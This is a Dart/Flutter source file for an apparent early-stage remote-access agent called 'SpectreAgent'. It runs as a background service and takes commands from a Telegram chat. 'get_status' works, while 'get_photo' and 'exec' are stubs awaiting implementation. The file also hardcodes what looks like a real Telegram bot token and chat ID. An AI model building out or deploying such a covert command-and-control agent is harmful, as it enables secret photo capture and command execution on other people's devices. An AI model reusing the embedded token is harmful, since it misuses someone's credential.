import 'dart:async';
import 'dart:ui';
import 'package:flutter/widgets.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
// Import the new library
import 'package:televerse/televerse.dart';

// TODO: REPLACE THESE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID
const String BOT_TOKEN = '7563152344:AAE2PvLBIGDbu-_s13XhWQTtAthQyquofNc';
const int CHAT_ID = -1002941249156; // Get this from a bot like @userinfobot

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  // The setup is slightly different with Televerse
  final bot = Bot(BOT_TOKEN);

  // The main listener setup
  bot.onMessage((message) async {
    // Only listen to commands from our specified chat
    if (message.chat.id != CHAT_ID) return;

    final text = message.text?.toLowerCase() ?? '';
    final parts = text.split(' ');
    final command = parts[0];

    print("Received command: $command");

    try {
      switch (command) {
        case 'get_status':
          // The reply method is slightly different
          await message.reply('SpectreAgent is online. Status: OK.');
          break;
        
        case 'get_photo':
          await message.reply('get_photo command received. Not implemented yet.');
          break;
        case 'exec':
          await message.reply('exec command received. Not implemented yet.');
          break;

        default:
          await message.reply('Unknown command: $command');
      }
    } catch (e) {
      await bot.api.sendMessage(ChatID(CHAT_ID), 'FUCK. Error executing command: $e');
    }
  });

  // Start the bot
  bot.start();
  service.invoke('update', {'message': 'SpectreAgent is listening...'});
}
